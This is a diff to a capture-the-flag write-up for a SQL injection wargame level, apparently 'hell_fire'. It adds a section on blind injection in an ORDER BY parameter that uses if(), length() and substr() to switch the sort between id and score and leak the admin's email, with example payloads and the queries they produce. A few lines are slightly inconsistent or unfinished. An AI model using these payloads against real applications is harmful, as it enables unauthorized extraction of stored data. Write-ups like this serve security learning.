@@ -78,7 +78,8 @@ SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' 
 ![4](https://github.com/Kunull/Write-ups/assets/110326359/3fb5f2f3-0632-4a05-9710-787bed3e5706)
 
 Since the `admin` user is sorted first, it means that `id='admin' AND length(email)=1` resulted in `True`. This tells us that the email length is 28.
-### Leaking the password
+
+### Leaking the email
 
 If we provide the following URI parameter:
 
@@ -308,3 +309,41 @@ The resultant query becomes:
 ```sql
 SELECT email FROM prob_hell_fire WHERE id='admin' AND email='admin_secure_email@emai1.com'
 ```
+
+## Blind SQL Injection - (Sorting by different columns)
+
+In this method, we will sort by the `id` column and the `score` column.
+In the table, `admin` comes first if sorted by `id` and `rubiya` comes first if sorted by `score`.
+
+### Retrieving the email length
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND length(email)=length, 'id', 'score')
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 'id', 'score')
+```
+
+If `length(email)=28` for `id='admin'`, the rows will be sorted by `id`. Otherwise, they will be sorted by `score`.
+
+### Leaking the email
+
+If we provide the following URI parameter:
+
+```
+?order=if(id='admin' AND substr(email, 1, 1)='a', 'id', 'score')
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 'id', 'score')
+```
+
+If the first character of `email` for `id='admin'`, the rows will be sorted by `id`. Otherwise, they will be sorted by `score`.
+
